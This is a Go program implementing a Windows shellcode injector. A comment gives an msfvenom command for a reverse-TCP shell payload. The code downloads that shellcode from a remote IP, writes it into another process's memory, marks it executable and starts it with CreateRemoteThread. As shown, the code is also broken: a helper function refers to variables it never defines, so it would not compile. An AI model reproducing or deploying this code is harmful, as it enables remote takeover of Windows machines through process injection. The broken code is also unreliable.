package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modKernel32 = syscall.NewLazyDLL("kernel32.dll")
)

func main() {
	//msfvenom -f raw -p windows/x64/shell/reverse_tcp  LHOST=192.168.217.128 LPORT=443 -o shcode.malic
	sc, err := wget("http://192.168.217.128/shcode.malic")
	if err != nil {
		log.Fatalf("[FATAL] Unable to connect to the host %v ", err)
	}
	pid := uint32(20496)
	pHandle, addr, err := GetMemory(pid)
	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(pHandle, addr, &sc[0], uintptr(len(sc)), &numberOfBytesWritten)
	if err != nil {
		log.Fatalf("[FATAL] Unable to write shellcode to the the allocated address")
	}
	fmt.Printf("[+] Wrote %d/%d bytes to destination address\n", numberOfBytesWritten, len(sc))

	var oldProtect uint32
	err = windows.VirtualProtectEx(pHandle, addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)

	if err != nil {
		log.Fatalf("[FATAL] VirtualProtect Failed: %v", err)
	}

	procCreateRemoteThread := modKernel32.NewProc("CreateRemoteThread")
	var threadId uint32 = 0
	tHandle, _, lastErr := procCreateRemoteThread.Call(
		uintptr(pHandle),
		uintptr(0),
		uintptr(0),
		addr,
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&threadId)),
	)
	if tHandle == 0 {
		log.Fatalf("[FATAL] Unable to Create Remote Thread: %v \n", lastErr)
	}

	fmt.Printf("[+] Handle of newly created thread:  0x%x \n[+] Thread ID: %d\n", tHandle, threadId)
	//windows.WaitForSingleObject(windows.Handle(tHandle), windows.INFINITE)
}
func wget(url string) ([]byte, error) {
	resp, err := http.Get(url)

	if err != nil {
		return []byte{}, err
	}

	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)

	if err != nil {
		return []byte{}, err
	}
	return body, nil
}

func GetMemory(pid uint32) (handle uintptr, addr uintptr, err error) {
	PROCESS_ALL_ACCESS := windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xFFFF

	fmt.Printf("[+] Obtained a handle 0x%x on process with ID: %d\n", pHandle, pid)

	procVirtualAllocEx := modKernel32.NewProc("VirtualAllocEx")

	addr, _, lastErr := procVirtualAllocEx.Call(
		uintptr(pHandle),
		uintptr(0),
		uintptr(len(sc)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_READWRITE))

	if addr == 0 {
		return 0, 0, fmt.Errorf("[FATAL] VirtualAlloc Failed: %v\n", lastErr)
	}

	fmt.Printf("[+] Allocated Memory Address: 0x%x\n", addr)
	return uintptr(pHandle), addr, nil
}
